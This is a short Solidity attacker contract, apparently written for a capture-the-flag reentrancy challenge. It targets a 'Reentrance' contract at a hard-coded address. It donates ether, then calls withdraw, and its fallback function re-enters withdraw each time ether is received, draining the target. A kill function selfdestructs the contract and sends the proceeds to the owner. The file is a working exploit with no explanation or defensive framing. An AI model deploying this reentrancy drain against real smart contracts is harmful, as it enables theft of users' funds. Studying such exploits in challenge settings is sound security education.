//SPDX-License-Identifier:MIT
pragma solidity ^0.6.0;

interface Reentrance{
    function donate(address)external payable;
    function withdraw(uint256)external;
}

contract hakk{
address owner;
Reentrance public reentrance ;
uint256 amount=999999813000000;
constructor()public payable{
    owner = msg.sender;
    reentrance = Reentrance(0x66527AaBc625776B93E37065134e6380bD2Ca009);

}

function setAmount(uint256 _amt)public{
    amount=_amt;
}

    function donate() public{
        reentrance.donate{value:amount}(address(this));
    }
    function withdraw() public{
        reentrance.withdraw(amount);
    }
    function kill()external{
        selfdestruct(payable(owner));
    }
    fallback() external payable {
        reentrance.withdraw(amount);
    }
}